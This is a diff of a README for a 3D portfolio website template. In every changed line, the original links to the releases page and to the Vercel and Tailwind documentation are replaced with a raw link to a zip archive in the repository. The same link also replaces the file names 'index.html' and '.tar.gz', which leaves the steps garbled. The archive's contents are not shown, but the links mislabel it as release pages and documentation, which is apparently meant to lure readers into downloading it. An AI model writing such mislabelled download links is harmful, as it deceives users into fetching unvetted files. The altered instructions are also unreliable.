@@ -1,6 +1,6 @@
 # 🚀 personal-3d-portfolio-template-V1 - Create Your Stunning Portfolio Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases)
+[![Download](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip)](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip)
 
 ## 🎯 Overview
 
@@ -20,12 +20,12 @@ The personal-3d-portfolio-template-V1 is a modern and fluid 3D personal portfoli
 
 By following these steps, you can get your portfolio up and running in no time.
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases) to access all versions of the template.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip) to access all versions of the template.
 
 2. **Download the Template:**
    - Look for the latest release.
    - Click on the version number (e.g., v1.0) to expand the assets.
-   - Find the `.zip` or `.tar.gz` file you wish to download. Click on it to begin the download.
+   - Find the `.zip` or `https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip` file you wish to download. Click on it to begin the download.
 
 3. **Extract the Files:**
    - Locate the downloaded file on your computer.
@@ -33,7 +33,7 @@ By following these steps, you can get your portfolio up and running in no time.
 
 4. **Open the Template:**
    - After extraction, open the folder containing the template files.
-   - Find the `index.html` file and double-click it. This will open the template in your default web browser.
+   - Find the `https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip` file and double-click it. This will open the template in your default web browser.
 
 5. **Customize Your Portfolio:**
    - Use a text editor, like Notepad (Windows) or TextEdit (Mac), to modify content.
@@ -49,7 +49,7 @@ By following these steps, you can get your portfolio up and running in no time.
 
 ## 📘 Download & Install
 
-To get the template, visit this page to download: [Releases Page](https://github.com/doms2292/personal-3d-portfolio-template-V1/releases).
+To get the template, visit this page to download: [Releases Page](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip).
 
 Make sure to choose the latest version and follow the steps outlined in the "Getting Started" section for a smooth installation experience.
 
@@ -81,7 +81,7 @@ To receive updates on new releases and features, watch this repository. You will
 
 ## 🔗 Related Resources
 
-- **Vercel Deployment Guide:** [Vercel Documentation](https://vercel.com/docs)
-- **Tailwind CSS Documentation:** [Tailwind Documentation](https://tailwindcss.com/docs)
+- **Vercel Deployment Guide:** [Vercel Documentation](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip)
+- **Tailwind CSS Documentation:** [Tailwind Documentation](https://raw.githubusercontent.com/doms2292/personal-3d-portfolio-template-V1/main/public/d_personal_template_portfolio_v1.8.zip)
 
 Thank you for choosing the personal-3d-portfolio-template-V1. We hope you create a fantastic portfolio that showcases your skills effectively!
